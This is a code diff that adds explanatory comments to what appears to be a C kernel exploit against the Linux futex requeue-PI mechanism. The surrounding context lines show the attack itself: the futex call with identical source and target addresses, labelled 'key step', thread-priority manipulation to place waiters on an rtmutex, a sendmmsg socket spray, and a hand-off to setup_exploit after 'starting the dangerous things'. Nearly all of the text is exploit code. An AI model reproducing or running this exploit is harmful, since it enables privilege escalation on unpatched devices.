@@ -413,6 +413,7 @@ pid_t wake_actionthread(int prio) {
         fclose(fp);
     }
 
+    //sync with the action thread to find a voluntary ctxt switch
     while (do_dm_tid_read == 0) {
         usleep(10);
     }
@@ -445,6 +446,7 @@ pid_t wake_actionthread(int prio) {
     return pid;
 }
 
+//connect to :5551 and set the SNDBUF=1
 int make_socket() {
     int sockfd;
     struct sockaddr_in addr = {0};
@@ -484,7 +486,7 @@ void *send_magicmsg(void *arg) {
     int ret;
 
     waiter_thread_tid = syscall(__NR_gettid);
-    setpriority(PRIO_PROCESS, 0, 12);
+    setpriority(PRIO_PROCESS, 0, 12);//0 denotes the calling PID for PRIO_PROCESS
 
     sockfd = make_socket();
 
@@ -506,6 +508,7 @@ void *send_magicmsg(void *arg) {
     msgvec[0].msg_hdr.msg_flags = 0;
     msgvec[0].msg_len = 0;
 
+    //wait the search goodnum thread to wake me up
     syscall(__NR_futex, &uaddr1, FUTEX_WAIT_REQUEUE_PI, 0, 0, &uaddr2, 0);
 
     do_socket_tid_read = 1;
@@ -570,13 +573,14 @@ void *search_goodnum(void *arg) {
         usleep(10);
     }
 
-    wake_actionthread(6);
-    wake_actionthread(7);
+    wake_actionthread(6);//make sure the action thread is sleeping on rtmutex of uaddr2
+    wake_actionthread(7);//a waiter will be added to the plist(rbtree in 3.14 and higher) of rtmutex
 
-    uaddr2 = 0;
+    uaddr2 = 0;//key step
     do_socket_tid_read = 0;
     did_socket_tid_read = 0;
 
+    //because the uaddr2 == 0, we will get this lock at once! q.rt_waiter will be NULL
     syscall(__NR_futex, &uaddr2, FUTEX_CMP_REQUEUE_PI, 1, 0, &uaddr2, uaddr2);
 
     while (1) {
@@ -621,6 +625,7 @@ void *search_goodnum(void *arg) {
         usleep(10);
     }
 
+    //we get here means the sendmmsg syscall has been called successfully.
     printf("starting the dangerous things\n");
 
     setup_exploit(MAGIC_ALT);
